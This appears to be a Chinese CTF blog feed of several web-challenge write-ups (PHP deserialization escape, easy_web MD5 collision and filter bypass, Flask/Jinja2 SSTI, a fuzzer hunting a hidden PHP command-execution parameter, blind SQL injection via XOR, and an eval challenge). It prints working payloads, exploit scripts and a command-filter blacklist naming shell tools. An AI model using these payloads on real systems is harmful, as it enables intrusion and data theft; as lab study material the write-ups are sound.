<p>也能够成功。因为反序列化时只要<code>a:3:&#123;s:4:"user";s:33:"";s:8:"function";s:10:"show_image";s:3:"img";s:13:"guest_img.png";s:3:"hdf";s:3:"zzf";&#125;</code>满足规律，并且已经能够返回数组了，那么后面的字符串就会被丢弃。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409203924.png" /></p>
<h2 id="本题利用">本题利用</h2>
<p>先直接给出payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET: f=show_image</span><br><span class="line"></span><br><span class="line">POST: _SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>上述的内容通过序列化得到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;flagflagflagflagflagflag&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:13:&quot;guest_img.png&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>但是，flag会被过滤，导致变成如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:13:&quot;guest_img.png&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>而<code>user</code>的值的24个字符往后找，正好是<code>";s:8:"function";s:59:"a</code>。从而将上面的字符串分为几大部分：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:3:&#123;</span><br><span class="line">s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;</span><br><span class="line">s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;</span><br><span class="line">s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;</span><br><span class="line">&quot;;s:3:&quot;img&quot;;s:13:&quot;guest_img.png&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>前四行正好能够满足序列化后的字符串的规律，因此对上述字符串反序列得到的数组如下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409204732.png" /></p>
<p>成功将我们想要读取的文件名注入。最后的那个只是因为数组需要三个键值对从而凑得。</p>
<p>其实<code>d0g3_f1ag.php</code>读取到的是flag文件名是什么。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409204918.png" /></p>
<p>将flag文件名base64编码后替代原来文件名的位置（注意长度是否有变化）即可（注意那个斜杠也是文件名的一部分！）</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409205037.png" /></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>反序列化字符串逃逸</tag>
        <tag>PHP变量覆盖</tag>
      </tags>
  </entry>
  <entry>
    <title>安洵杯 2019 easy_web</title>
    <url>/2022/04/01/%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%20easy_web/</url>
    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境，先检查了源码，发现了返回了一张图片经过base64编码后的内容。并且有一句提示：<code>md5 is funny</code>。然后观察url
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">d835c69c-0e67-4191-8b98-d25591d19b6e.node4.buuoj.cn:81/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</span><br></pre></td></tr></table></figure></p>
<p>注意到两个参数<code>cmd</code>和<code>img</code>。后者的内容像是经过base64编码的，因此先进行解码。推荐网址：https://gchq.github.io/CyberChef/</p>
<p>调用<code>magic</code>模块，发现编码规则，先经过两次base64，然后再进行16进制解码还原原来的字符串。
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401220118.png" /></p>
<p>因此，这里可以传入一个文件名。虽然有可能只接受图片，但是作为尝试可以试一下<code>index.php</code>。</p>
<h1 id="解题">解题</h1>
<p>首先将<code>index.php</code>进行编码，然后传入img参数，cmd先保持不变。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401220308.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401220429.png" /></p>
<p>将返回的内容base64解码后得到如下代码（重要部分）： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    header(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line">	</span><br><span class="line"><span class="variable">$file</span> = hex2bin(base64_decode(base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;      <span class="comment">// img不能含有flag</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixi～ no flag&quot;</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = base64_encode(file_get_contents(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;  <span class="comment">// 会将系统命令执行</span></span><br><span class="line">    &#125; </span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>echo `$cmd`; 这句话会将 cmd 变量作为系统命令执行并输出，像是echo
system($cmd)</p>
</blockquote>
<p>这个代码可以分为两个部分，第一部分关于img参数，主要作用就是读取文件内容；第二部分就是cmd参数，主要作用就是命令执行。由于img过滤了flag，所以读取flag的内容应该通过命令执行获得。即重要的是第二部分。</p>
<p>第二部分有一个难题，那就是如何绕过如下代码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br></pre></td></tr></table></figure></p>
<p>如果只有后者，可以通过传入数组绕过，但是前面的却无法这样绕过。因此只能使用md5碰撞来绕过，也就是两个字符串不一样，但是它们md5值一样，从网上找到了两组：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line">&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br><span class="line"></span><br><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure></p>
<p>这里比较难以理解的是为什么反斜杠可以绕过：<code>l\s</code>
可以执行。</p>
<blockquote>
<p>php解释器会将<code>//</code>解释为一个反斜杠；正则解释器也是一个道理。如果要用php正则匹配一个反斜杠，需要写4个反斜杠，因为四个反斜杠经过php解释器会变成两个反斜杠，两个反斜杠经过正则解释器会变成一个反斜杠，所以能够匹配。但是反常的是有时候三个反斜杠才能正则匹配一个反斜杠（本题就是），所以本题可以使用反斜杠绕过。</p>
</blockquote>
<p>但是也可以用其他办法，比如<code>ls</code>用<code>dir</code>代替，<code>cat</code>
用<code>sort</code>代替。因此payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. dir+/</span><br><span class="line">2. sort+/flag</span><br></pre></td></tr></table></figure></p>
<p>用burp提交！+也可以用%20代替。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401223906.png" /></p>
<h1 id="总结">总结</h1>
<p>本题的难点主要在于MD5碰撞和最后的过滤绕过。尤其是反斜杠绕过，实在不能理解。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>php伪协议</tag>
        <tag>MD5碰撞绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界_shrine</title>
    <url>/2022/04/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_shrine/</url>
    <content><![CDATA[<p>题目地址：https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5422&amp;page=1</p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境会看到一堆代码，是无序的，但是查看页面源码就会得到整齐的代码：
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span>(<span class="params">shrine</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></p>
<ul>
<li>第一，由<code>app.config['FLAG'] = os.environ.pop('FLAG')</code>，知道flag在<code>app.config['FLAG']</code>里；</li>
<li>第二可以访问/shrine/xxx；</li>
<li>第三，<code>(, ), config, self</code>被禁用，那么传统的模板注入就不行了。</li>
</ul>
<p>查看是否存在SSTI：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. shrine/$&#123;7*7&#125; # 结果 $&#123;7*7&#125;</span><br><span class="line">2. shrine/&#123;&#123;7*7&#125;&#125; # 结果 49</span><br><span class="line">3. shrine/&#123;&#123;7*&#x27;7&#x27;&#125;&#125; # 结果 7777777</span><br></pre></td></tr></table></figure>
<p>存在SSTI，并且模板引擎为Jinjia2或者flask。</p>
<h1 id="解题">解题</h1>
<p>这里因为过滤了传统SSTI所必须的一些字符，因此得使用其他办法。又因为flag在环境变量中，考虑直接读取。</p>
<p>读取内容。 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> &#123;&#123;url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config[<span class="string">&#x27;FLAG&#x27;</span>]&#125;&#125;</span><br><span class="line"><span class="number">2.</span> &#123;&#123;get_flashed_messages.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config[<span class="string">&#x27;FLAG&#x27;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>直接得到flag：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405155128.png" /></p>
]]></content>
      <categories>
        <category>SSTI</category>
      </categories>
      <tags>
        <tag>Flask</tag>
        <tag>Jinjia2</tag>
      </tags>
  </entry>
  <entry>
    <title>强网杯 2019 高明的黑客</title>
    <url>/2022/03/29/%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%20%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/</url>
    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境，得到如下信息</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329083958.png" /></p>
<p>因此访问如下网址，将源码下载下来 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://12e408b2-7b34-441d-a3f5-a689f716cfd5.node4.buuoj.cn:81/www.tar.gz</span><br></pre></td></tr></table></figure></p>
<p>发现有 3002 个文件，并且除了一个 <code>index.html</code>
之外，其他的文件里面充斥着 <code>$_GET</code> <code>$_POST</code>
<code>system</code>
，一看就是命令执行，但是随便打开文件，拿出一个尝试却不行。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329084335.png" /></p>
<p>因此认为，这3000+文件里面，只有一个文件的一个 payload
是有效的，其他的文件和 payload 只不过是这个 “高明的黑客”
弄出来的伪装。</p>
<h1 id="解题">解题</h1>
<p>3000多文件，手动验证肯定是不可能的，因此使用脚本： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, os, re, time</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, wait, ALL_COMPLETED, as_completed</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1/BUUtest/src/&#x27;</span></span><br><span class="line">filePath = <span class="string">&#x27;D:\\phpStudy2018\\PHPTutorial\\WWW\\BUUtest\\src\\&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">file</span>):</span></span><br><span class="line">    pattern = <span class="string">&quot;(\$_POST|\$_GET)\[&#x27;(.*?)&#x27;\]&quot;</span></span><br><span class="line">    gets = []</span><br><span class="line">    posts = []</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;正在尝试 <span class="subst">&#123;file&#125;</span>:&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filePath+file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.readlines()</span><br><span class="line">    <span class="comment"># 找出所有的 (\$_POST|\$_GET)\[&#x27;(.*?)&#x27;\] 中的单引号的内容，即参数</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> content:</span><br><span class="line">        s = re.search(pattern, line)</span><br><span class="line">        <span class="keyword">if</span> s:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;GET&quot;</span> <span class="keyword">in</span> s.group():</span><br><span class="line">                gets.append(s.group(<span class="number">2</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                posts.append(s.group(<span class="number">2</span>))</span><br><span class="line">        <span class="comment"># print(gets)</span></span><br><span class="line">        <span class="comment"># print(posts)</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;echo &quot;success!!!&quot;&#x27;</span></span><br><span class="line">    <span class="comment"># 开始发送 GET 请求</span></span><br><span class="line">    <span class="keyword">for</span> get <span class="keyword">in</span> gets:</span><br><span class="line">        newUrl = url + file + <span class="string">&quot;?&quot;</span> + get + <span class="string">&quot;=&quot;</span> + payload</span><br><span class="line">        <span class="comment"># print(newUrl)</span></span><br><span class="line">        r = requests.get(newUrl)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;find it! filename is <span class="subst">&#123;file&#125;</span>, method is get and payload is <span class="subst">&#123;get&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="comment"># 开始发送 POST 请求</span></span><br><span class="line">    <span class="keyword">for</span> post <span class="keyword">in</span> posts:</span><br><span class="line">        newUrl = url + file</span><br><span class="line">        r = requests.post(newUrl, data=&#123;post: payload&#125;)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;find it! filename is <span class="subst">&#123;file&#125;</span>, method is post and payload is <span class="subst">&#123;post&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;程序开始：&quot;</span>)</span><br><span class="line">    fileNames = os.listdir(filePath)</span><br><span class="line">    startTime = time.time()</span><br><span class="line">    executor = ThreadPoolExecutor(<span class="number">100</span>)</span><br><span class="line">    all_tasks = [executor.submit(exp, file) <span class="keyword">for</span> file <span class="keyword">in</span> fileNames]</span><br><span class="line">    wait(all_tasks, return_when=ALL_COMPLETED)</span><br><span class="line">    endTime = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;total time is &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(endTime - startTime)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;程序结束！&quot;</span>)</span><br></pre></td></tr></table></figure></p>
<p>这是最终版的脚本。之前用的单线程，可能跑一天都跑不出来，如果开启多线程，BUUOJ这个网址就会返回
<code>too many requests</code>
。因此最终的解决办法就是在自己主机上搭建环境，然后测试。</p>
<p>最终结果：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329084725.png" /></p>
<p>最终跑了3个多小时，由于我代码能力差，因为如果各位有更好的优化方法可以告诉我。</p>
<p>拿到 <code>文件</code> <code>payload</code> <code>提交办法</code>
后就可以命令执行了。（这里是 GET
方式，所以无法用蚁剑连接，在自己主机上测试过）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. /xk0SzyKwfzw.php?Efa5BVG=ls / # 查看根目录文件，发现 flag</span><br><span class="line">2. /xk0SzyKwfzw.php?Efa5BVG=cat /flag # flag get</span><br></pre></td></tr></table></figure>
<h1 id="总结">总结</h1>
<p>本题考察的并不是代码审计，而是脚本编写能力。不论怎么说，还真是一道有意思的题目呀。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>极客大挑战 2019 FinalSQL</title>
    <url>/2022/04/17/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%20FinalSQL/</url>
    <content><![CDATA[<p>题目地址：<a
href="https://buuoj.cn/challenges#%5B极客大挑战%202019%5DFinalSQL">FinalSQL</a></p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入页面，经过相关的测试，发现了三个可能的注入点：用户名、密码和点击数字小方框之后url出现的id。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220417181329.png" /></p>
<p>并且，根据最上面的提示，本题估计是sql盲注。</p>
<h1 id="解题">解题</h1>
<p>首先以为注入点在用户名和密码，就对其进行了模糊测试：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220417181744.png" /></p>
<p>发现过滤了许多东西，而且无法绕过。后来找到了当输入<code>\</code>时，系统报错了，我欣喜若狂，以为这里就是注入点，并且之前还记录了[[过滤单引号的注入方法]]。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220417181822.png" /></p>
<p>经过测试，这里确实存在着注入点，但是许多要使用的关键词都被过滤了，比如<code>or</code>、<code>and</code>等，导致无法绕过。</p>
<p>之后我又去尝试了一下第三个可能的注入点，当我输入如下值时：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1=1 # NO! Not this! Click others</span><br><span class="line">?id=1=2 # ERROR!!!</span><br></pre></td></tr></table></figure></p>
<p>觉得这里存在着注入点，又经过了不断尝试，确定了注入点就在<code>id</code>，并且参数值正确的时候返回的就是该页面本来的内容，当参数值不正确的时候返回的就是<code>ERROR!!!</code>。</p>
<p>随后我进行了模糊测试</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220417182427.png" /></p>
<p>（其中长度890的都是被过滤了）</p>
<p>由于这里没有回显，因此尝试盲注（脚本建议自己写，这题的flag字段内容非常多，就离谱）。payload如下：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据库长度: </span><br><span class="line">	异或: ?id=0^(length(database())=4) </span><br><span class="line">	or: ?id=(0)or(length(database())=4) # 下面的也可以用or</span><br><span class="line"></span><br><span class="line">数据库名: ?id=0^(ascii(substr(database(),%d,1))=%d) -&gt; geek</span><br><span class="line"></span><br><span class="line">表名：?id=0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))=%d) -&gt; F1naI1y,Flaaaaag</span><br><span class="line"></span><br><span class="line">字段名: ?id=0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;,%d,1))=%d) -&gt; id,username,password</span><br><span class="line"></span><br><span class="line">字段信息: ?id=0^(ascii(substr(reverse((select(group_concat(password))from(F1naI1y))),%d,1))=%d)</span><br><span class="line">(最后非常的阴间！！！flag在最后面，所以我倒着求，如果正着，总共有200+个字符！！！)</span><br></pre></td></tr></table></figure></p>
<hr />
<p>这里解释一下异或： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0^0 -&gt; 0</span><br><span class="line">0^1 -&gt; 1</span><br><span class="line">1^0 -&gt; 1</span><br><span class="line">1^1 -&gt; 0</span><br></pre></td></tr></table></figure></p>
<p>以数据库长度的payload为例： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果这个为真(length(database())=4)，即值为1，那么?id=0^1=1，从而显示正确的页面内容。</span><br><span class="line">如果这个为假(length(database())=3)，即值为0，那么?id=0^0=0，从而显示错误的页面内容。</span><br></pre></td></tr></table></figure></p>
<p>因此，当<code>or</code>和<code>and</code>都被过滤的时候，可以考虑一下异或。</p>
<hr />
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>极客大挑战 2019 RCE ME</title>
    <url>/2022/04/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%20RCE%20ME/</url>
    <content><![CDATA[<p>题目地址：<a
href="https://buuoj.cn/challenges#%5B极客大挑战%202019%5DRCE%20ME">RCE
ME</a></p>
<span id="more"></span>
<h1 id="题目信息">1. 题目信息</h1>
<p>源码如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>通过代码审计： - 以GET方式传入参数code - code长度不能超过40 -
code内不能包含大小写字母以及数字</p>
<h1 id="解题">2. 解题</h1>
<p>虽然知道存在RCE，但是这里不能使用字母和数字，因此可以使用取反绕过和异或绕过。</p>
